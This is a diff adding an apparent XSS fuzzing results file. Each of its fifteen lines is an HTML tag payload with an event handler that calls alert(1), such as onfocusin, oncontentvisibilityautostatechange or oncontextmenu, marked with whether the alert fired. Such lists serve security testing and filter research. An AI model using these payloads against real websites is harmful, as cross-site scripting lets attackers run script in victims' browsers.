@@ -1,0 +1,15 @@
+Payload: <a autofocus onfocusin=alert(1) href></a> | Alert: True
+Payload: <a contenteditable onbeforeinput=alert(1)>test</a> | Alert: False
+Payload: <a oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <a oncontextmenu="alert(1)" style=display:block>test</a> | Alert: False
+Payload: <a oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <a oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <a ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</a> | Alert: False
+Payload: <a onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <a onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</a><input value=clickme> | Alert: False
+Payload: <a2 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <a2 oncontextmenu="alert(1)" style=display:block>test</a2> | Alert: False
+Payload: <abbr oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <abbr oncontextmenu="alert(1)" style=display:block>test</abbr> | Alert: False
+Payload: <acronym oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <acronym oncontextmenu="alert(1)" style=display:block>test</acronym> | Alert: False
